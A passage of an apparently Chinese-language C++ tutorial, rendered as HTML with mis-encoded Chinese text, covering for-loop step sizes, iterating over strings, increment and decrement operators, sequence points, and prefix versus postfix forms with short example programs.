åˆ° 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Countdown:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> count = <span class="number">5</span>; count &gt; <span class="number">0</span>; count = count - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; count &lt;&lt; <span class="string">&quot;...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Liftoff!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-3-ä¿®æ”¹æ­¥é•¿"><a href="#5-1-3-ä¿®æ”¹æ­¥é•¿" class="headerlink" title="5.1.3 ä¿®æ”¹æ­¥é•¿"></a>5.1.3 ä¿®æ”¹æ­¥é•¿</h3><p><code>for</code> å¾ªç¯çš„æ›´æ–°éƒ¨åˆ†ä¸ä¸€å®šæ€»æ˜¯åŠ  1 æˆ–å‡ 1ã€‚ä½ å¯ä»¥æ ¹æ®éœ€è¦æŒ‡å®šä»»ä½•æœ‰æ•ˆçš„æ›´æ–°è¡¨è¾¾å¼ã€‚</p><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä»¥æ­¥é•¿ 2 é€’å¢ï¼Œæ‰“å°å¶æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Even numbers less than 10:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i = i + <span class="number">2</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0 2 4 6 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»¥æ­¥é•¿ 5 é€’å‡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Counting down by 5s:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">50</span>; n &gt;= <span class="number">0</span>; n = n - <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 50 45 40 35 30 25 20 15 10 5 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ä¹˜æ³•ä½œä¸ºæ­¥é•¿ (æ³¨æ„é¿å…æ— é™å¾ªç¯)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Powers of 2 less than 100:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">1</span>; p &lt; <span class="number">100</span>; p = p * <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1 2 4 8 16 32 64</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-4-ä½¿ç”¨forå¾ªç¯è®¿é—®å­—ç¬¦ä¸²"><a href="#5-1-4-ä½¿ç”¨forå¾ªç¯è®¿é—®å­—ç¬¦ä¸²" class="headerlink" title="5.1.4 ä½¿ç”¨forå¾ªç¯è®¿é—®å­—ç¬¦ä¸²"></a>5.1.4 ä½¿ç”¨forå¾ªç¯è®¿é—®å­—ç¬¦ä¸²</h3><p><code>for</code> å¾ªç¯æ˜¯éå†å­—ç¬¦ä¸²ï¼ˆæ— è®ºæ˜¯ C é£æ ¼å­—ç¬¦ä¸²è¿˜æ˜¯ <code>std::string</code> å¯¹è±¡ï¼‰ä¸­æ¯ä¸ªå­—ç¬¦çš„å¸¸ç”¨æ–¹æ³•ã€‚</p><p><strong>ç¤ºä¾‹ (C é£æ ¼å­—ç¬¦ä¸²):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // ä¸ºäº† strlen()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> message[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(message); <span class="comment">// è·å–å­—ç¬¦ä¸²é•¿åº¦ (ä¸åŒ…æ‹¬ \0)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters in \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i = i + <span class="number">1</span>) &#123; <span class="comment">// ç´¢å¼•ä» 0 åˆ° len-1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; message[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥ä½¿ç”¨æŒ‡é’ˆå’Œç©ºå­—ç¬¦åˆ¤æ–­</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters using pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> *p = message; *p != <span class="string">&#x27;\0&#x27;</span>; p = p + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ (std::string):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters in \&quot;&quot;</span> &lt;&lt; word &lt;&lt; <span class="string">&quot;\&quot;:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ size() è·å–é•¿åº¦ï¼Œsize_t é€šå¸¸æ˜¯åˆé€‚çš„ç´¢å¼•ç±»å‹</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; word.size(); i = i + <span class="number">1</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; word[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// C++11 åŸºäºèŒƒå›´çš„ for å¾ªç¯ (æ›´ç®€æ´ï¼Œè§ 5.4)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Characters using range-based for:&quot; &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">// for (char ch : word) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; ch &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-5-é€’å¢è¿ç®—ç¬¦ï¼ˆ-ï¼‰å’Œé€’å‡è¿ç®—ç¬¦ï¼ˆâ€“ï¼‰"><a href="#5-1-5-é€’å¢è¿ç®—ç¬¦ï¼ˆ-ï¼‰å’Œé€’å‡è¿ç®—ç¬¦ï¼ˆâ€“ï¼‰" class="headerlink" title="5.1.5 é€’å¢è¿ç®—ç¬¦ï¼ˆ++ï¼‰å’Œé€’å‡è¿ç®—ç¬¦ï¼ˆâ€“ï¼‰"></a>5.1.5 é€’å¢è¿ç®—ç¬¦ï¼ˆ++ï¼‰å’Œé€’å‡è¿ç®—ç¬¦ï¼ˆâ€“ï¼‰</h3><p>C++ æä¾›äº†ä¸¤ä¸ªéå¸¸æœ‰ç”¨çš„è¿ç®—ç¬¦æ¥ç®€åŒ–å˜é‡åŠ  1 æˆ–å‡ 1 çš„æ“ä½œï¼š</p><ul><li>  <strong>é€’å¢è¿ç®—ç¬¦ (<code>++</code>):</strong> å°†æ“ä½œæ•°çš„å€¼å¢åŠ  1ã€‚</li><li>  <strong>é€’å‡è¿ç®—ç¬¦ (<code>--</code>):</strong> å°†æ“ä½œæ•°çš„å€¼å‡å°‘ 1ã€‚</li></ul><p>å®ƒä»¬å¯ä»¥ç”¨äºæ•´æ•°ç±»å‹ã€æµ®ç‚¹ç±»å‹å’ŒæŒ‡é’ˆç±»å‹ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">double</span> value = <span class="number">10.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€’å¢</span></span><br><span class="line">    count++; <span class="comment">// ç­‰ä»·äº count = count + 1; ç°åœ¨ count æ˜¯ 6</span></span><br><span class="line">    ++value; <span class="comment">// ç­‰ä»·äº value = value + 1; ç°åœ¨ value æ˜¯ 11.5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count after increment: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value after increment: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€’å‡</span></span><br><span class="line">    count--; <span class="comment">// ç­‰ä»·äº count = count - 1; ç°åœ¨ count æ˜¯ 5</span></span><br><span class="line">    --value; <span class="comment">// ç­‰ä»·äº value = value - 1; ç°åœ¨ value æ˜¯ 10.5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count after decrement: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value after decrement: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨ for å¾ªç¯ä¸­ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop using ++:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123; <span class="comment">// ä½¿ç”¨ ++i æˆ– i++ æ•ˆæœç›¸åŒ (ä½œä¸ºç‹¬ç«‹è¯­å¥)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-6-å‰¯ä½œç”¨å’Œé¡ºåºç‚¹"><a href="#5-1-6-å‰¯ä½œç”¨å’Œé¡ºåºç‚¹" class="headerlink" title="5.1.6 å‰¯ä½œç”¨å’Œé¡ºåºç‚¹"></a>5.1.6 å‰¯ä½œç”¨å’Œé¡ºåºç‚¹</h3><p><strong>å‰¯ä½œç”¨ (Side Effect):</strong> æŒ‡çš„æ˜¯ä¿®æ”¹å˜é‡çš„å€¼æˆ–æ‰§è¡Œ I/O æ“ä½œç­‰æ”¹å˜ç¨‹åºçŠ¶æ€çš„è¡Œä¸ºã€‚é€’å¢ (<code>++</code>) å’Œé€’å‡ (<code>--</code>) è¿ç®—ç¬¦éƒ½å…·æœ‰å‰¯ä½œç”¨ï¼Œå› ä¸ºå®ƒä»¬ä¼šä¿®æ”¹æ“ä½œæ•°çš„å€¼ã€‚</p><p><strong>é¡ºåºç‚¹ (Sequence Point):</strong> æ˜¯ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ—¶é—´ç‚¹ï¼Œåœ¨è¯¥ç‚¹ä¹‹å‰çš„æ‰€æœ‰å‰¯ä½œç”¨éƒ½å·²å®Œæˆï¼Œå¹¶ä¸”åç»­çš„å‰¯ä½œç”¨å°šæœªå‘ç”Ÿã€‚C++ æ ‡å‡†å®šä¹‰äº†ä¸€äº›é¡ºåºç‚¹ï¼Œä¾‹å¦‚ï¼š</p><ul><li>  åˆ†å· <code>;</code> (è¯­å¥ç»“æŸå¤„)</li><li>  å®Œæ•´è¡¨è¾¾å¼ç»“æŸæ—¶ï¼ˆå¦‚ <code>if</code> æ¡ä»¶ã€<code>while</code> æ¡ä»¶ã€<code>for</code> å¾ªç¯çš„ä¸‰ä¸ªéƒ¨åˆ†ä¹‹åï¼‰</li><li>  å‡½æ•°è°ƒç”¨ä¹‹å‰ï¼ˆæ‰€æœ‰å‚æ•°çš„å‰¯ä½œç”¨å®Œæˆï¼‰</li><li>  æŸäº›è¿ç®—ç¬¦ï¼ˆå¦‚ <code>&amp;&amp;</code>, <code>||</code>, <code>,</code> é€—å·è¿ç®—ç¬¦ï¼‰çš„ç‰¹å®šä½ç½®</li></ul><p><strong>é‡è¦æ€§:</strong> åœ¨ä¸¤ä¸ªé¡ºåºç‚¹ä¹‹é—´ï¼Œ<strong>ä¸è¦</strong>å¯¹åŒä¸€ä¸ªå˜é‡è¿›è¡Œå¤šæ¬¡ä¿®æ”¹ï¼Œæˆ–è€…æ—¢ä¿®æ”¹å®ƒåˆè¯»å–å®ƒï¼ˆé™¤äº†è¯»å–å®ƒçš„å€¼ä»¥è®¡ç®—è¦å†™å…¥çš„å€¼ä¹‹å¤–ï¼‰ã€‚å¦åˆ™ï¼Œè¡Œä¸ºæ˜¯**æœªå®šä¹‰çš„ (Undefined Behavior)**ï¼Œç¼–è¯‘å™¨å¯èƒ½äº§ç”Ÿä»»ä½•ç»“æœã€‚</p><p><strong>ç¤ºä¾‹ (æœªå®šä¹‰è¡Œä¸º):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœªå®šä¹‰è¡Œä¸º: åœ¨åŒä¸€è¡¨è¾¾å¼ä¸­å¤šæ¬¡ä¿®æ”¹ xï¼Œä¸”æ²¡æœ‰é¡ºåºç‚¹åˆ†éš”</span></span><br><span class="line">    <span class="comment">// y = (x++) * (x++); // ä¸è¦è¿™æ ·å†™! ç»“æœä¸å¯é¢„æµ‹</span></span><br><span class="line">    <span class="comment">// y = x + (++x);     // ä¸è¦è¿™æ ·å†™! ç»“æœä¸å¯é¢„æµ‹</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; x &lt;&lt; (++x); // ä¸è¦è¿™æ ·å†™! è¾“å‡ºé¡ºåºå’Œ x çš„æœ€ç»ˆå€¼ä¸å¯é¢„æµ‹</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®‰å…¨çš„å†™æ³•: ä½¿ç”¨é¡ºåºç‚¹åˆ†éš”å‰¯ä½œç”¨</span></span><br><span class="line">    y = x++; <span class="comment">// y è·å– x çš„åŸå§‹å€¼ 5, ç„¶å x å˜ä¸º 6 (å‰¯ä½œç”¨åœ¨åˆ†å·å¤„å®Œæˆ)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;, x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º y = 5, x = 6</span></span><br><span class="line">    </span><br><span class="line">    y = ++x; <span class="comment">// x å…ˆå˜ä¸º 7, ç„¶å y è·å–æ–°å€¼ 7 (å‰¯ä½œç”¨åœ¨åˆ†å·å¤„å®Œæˆ)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;, x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º y = 7, x = 7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»“è®º:</strong> é¿å…åœ¨å•ä¸ªè¡¨è¾¾å¼ä¸­å¯¹åŒä¸€å˜é‡äº§ç”Ÿå¤æ‚çš„ã€ä¾èµ–äºå‰¯ä½œç”¨é¡ºåºçš„æ“ä½œã€‚å°†å®ƒä»¬åˆ†è§£æˆå¤šä¸ªè¯­å¥é€šå¸¸æ›´å®‰å…¨ã€æ›´æ¸…æ™°ã€‚</p><h3 id="5-1-7-å‰ç¼€æ ¼å¼å’Œåç¼€æ ¼å¼"><a href="#5-1-7-å‰ç¼€æ ¼å¼å’Œåç¼€æ ¼å¼" class="headerlink" title="5.1.7 å‰ç¼€æ ¼å¼å’Œåç¼€æ ¼å¼"></a>5.1.7 å‰ç¼€æ ¼å¼å’Œåç¼€æ ¼å¼</h3><p>é€’å¢ (<code>++</code>) å’Œé€’å‡ (<code>--</code>) è¿ç®—ç¬¦éƒ½æœ‰ä¸¤ç§ä½¿ç”¨å½¢å¼ï¼š</p><ol><li><strong>å‰ç¼€ (Prefix):</strong> è¿ç®—ç¬¦æ”¾åœ¨æ“ä½œæ•°ä¹‹å‰ (<code>++x</code>, <code>--x</code>)ã€‚<ul><li>  <strong>è¡Œä¸º:</strong> <strong>å…ˆ</strong>ä¿®æ”¹æ“ä½œæ•°çš„å€¼ï¼ˆåŠ  1 æˆ–å‡ 1ï¼‰ï¼Œ<strong>ç„¶å</strong>ä½¿ç”¨ä¿®æ”¹åçš„å€¼ä½œä¸ºæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœã€‚</li></ul></li><li><strong>åç¼€ (Postfix):</strong> è¿ç®—ç¬¦æ”¾åœ¨æ“ä½œæ•°ä¹‹å (<code>x++</code>, <code>x--</code>)ã€‚<ul><li>  <strong>è¡Œä¸º:</strong> <strong>å…ˆ</strong>ä½¿ç”¨æ“ä½œæ•°çš„<strong>åŸå§‹å€¼</strong>ä½œä¸ºæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœï¼Œ<strong>ç„¶å</strong>å†ä¿®æ”¹æ“ä½œæ•°çš„å€¼ï¼ˆåŠ  1 æˆ–å‡ 1ï¼‰ã€‚</li></ul></li></ol><p><strong>åŒºåˆ«åœ¨äºè¡¨è¾¾å¼çš„å€¼:</strong></p><table><thead><tr><th align="left">è¡¨è¾¾å¼</th><th align="left">è¡Œä¸ºæè¿°</th><th align="left">è¡¨è¾¾å¼çš„å€¼</th><th align="left">æ“ä½œæ•°æœ€ç»ˆå€¼</th></tr></thead><tbody><tr><td align="left"><code>++x</code></td><td align="left">å…ˆå°† <code>x</code> åŠ  1</td><td align="left"><code>x</code> çš„æ–°å€¼</td><td align="left">æ–°å€¼</td></tr><tr><td align="left"><code>x++</code></td><td align="left">å…ˆä½¿ç”¨ <code>x</code> çš„åŸå§‹å€¼</td><td align="left"><code>x</code> çš„åŸå§‹å€¼</td><td align="left">æ–°å€¼</td></tr><tr><td align="left"><code>--x</code></td><td align="left">å…ˆå°† <code>x</code> å‡ 1</td><td align="left"><code>x</code> çš„æ–°å€¼</td><td align="left">æ–°å€¼</td></tr><tr><td align="left"><code>x--</code></td><td align="left">å…ˆä½¿ç”¨ <code>x</code> çš„åŸå§‹å€¼</td><td align="left"><code>x</code> çš„åŸå§‹å€¼</td><td align="left">æ–°å€¼</td></tr></tbody></table><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>, b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> result_a, result_b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‰ç¼€é€’å¢</span></span><br><span class="line">    result_a = ++a; <span class="comment">// a å…ˆå˜æˆ 6, ç„¶å result_a è¢«èµ‹å€¼ä¸º 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Prefix: result_a = &quot;</span> &lt;&lt; result_a &lt;&lt; <span class="string">&quot;, a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 6, 6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åç¼€é€’å¢</span></span><br><span class="line">    result_b = b++; <span class="comment">// result_b å…ˆè¢«èµ‹å€¼ä¸º b çš„åŸå§‹å€¼ 5, ç„¶å b å˜æˆ 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Postfix: result_b = &quot;</span> &lt;&lt; result_b &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 5, 6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨ for å¾ªç¯æ›´æ–°éƒ¨åˆ†ï¼Œé€šå¸¸å‰ç¼€å’Œåç¼€æ•ˆæœç›¸åŒ</span></span><br><span class="line">    <span class="comment">// ä½†åœ¨å¤æ‚è¡¨è¾¾å¼ä¸­ï¼Œå®ƒä»¬çš„åŒºåˆ«å¾ˆé‡è¦</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span 